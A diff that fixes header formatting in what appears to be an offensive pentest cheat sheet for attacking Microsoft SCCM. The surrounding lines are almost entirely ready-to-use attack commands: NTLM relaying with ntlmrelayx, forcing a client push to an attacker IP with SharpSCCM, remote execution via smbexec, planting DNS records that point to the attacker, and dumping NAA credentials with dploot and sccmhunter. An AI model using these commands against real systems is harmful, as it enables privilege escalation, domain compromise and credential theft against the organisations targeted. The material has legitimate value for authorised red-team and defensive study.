@@ -9,17 +9,17 @@
 ## Creds-1 No credentials >>> NAA credentials || User + Pass
 - Extract from pxe See no creds >>> PXE
 
-##  Elevate-1:Relay on site systems Simple user >>> Admin on Site system
+## Elevate-1: Relay on site systems Simple user >>> Admin on Site system
 - coerce sccm site server
   - `ntlmrelayx.py -tf <site_systems> -smb2support`
 
-## Elevate-2:Force client push Simple user >>> Admin
+## Elevate-2: Force client push Simple user >>> Admin
 - `ntlmrelayx.py -t <sccm_server> -smb2support -socks # listen connection`
   - `SharpSCCM.exe invoke client-push -mp <sccm_server>.<domain> -sc <site_code> -t <attacker_ip> # Launch client push install`
     - `proxychains smbexec.py -no-pass <domain>/<socks_user>@<sccm_server>`
       - cleanup
 
-## Elevate-3:Automatic client push Simple user >>> Relay ntlm
+## Elevate-3: Automatic client push Simple user >>> Relay ntlm
 - Create DNS A record for non existing computer x
   - `dnstool.py -u '<domain>\<user>' -p <pass>  -r <newcomputer>.<domain> -a add -t A -d <attacker_ip> <dc_ip>`
     -  Enroll new computer x in AD  then remove host SPN from the machine account
@@ -58,7 +58,7 @@
   - `SharpSCCM.exe get secrets -r newcomputer -u <computer_added>$ -p <computer_pass>"`
     - cleanup
 
-## Creds-3Creds-4 Computer Admin user >>> NAA credentials
+## Creds-3/Creds-4 Computer Admin user >>> NAA credentials
 - `dploot.py sccm -u <admin> -p '<password>' <sccm_target>`
 - `sccmhunter.py dpapi  -u <admin> -p '<password>' -target <sccm_target> -debug`
 - `SharpSCCM.exe local secrets -m disk`
